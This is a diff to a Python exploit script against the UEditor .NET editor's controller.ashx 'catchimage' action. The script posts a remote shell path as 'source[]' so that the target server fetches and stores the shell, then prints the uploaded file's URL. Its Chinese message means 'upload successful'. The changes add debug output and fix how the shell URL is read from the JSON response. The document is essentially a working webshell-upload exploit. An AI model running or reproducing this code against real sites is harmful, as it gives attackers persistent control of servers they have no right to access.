@@ -5,6 +5,7 @@ import sys
 
 def upload(site, shellpath):
     url = site +  '/ueditor/net/controller.ashx'
+    print(url)
     photo_shell = shellpath
     headers = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -16,9 +17,10 @@ def upload(site, shellpath):
         }
     req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell,verify=False, timeout=5)
     info = req.json()
+    print(info)
     if info['state'] == 'SUCCESS':
-        print('[+] 上传成功！ 请查看响应包内容！')
-        print(site+"/ueditor/net/" + info['url'])
+        print('[+] 上传成功！ 请查看响应包内容！',  site+"/ueditor/net/" + info['list'][0]['url'])
+  
         
         
 if __name__=="__main__":
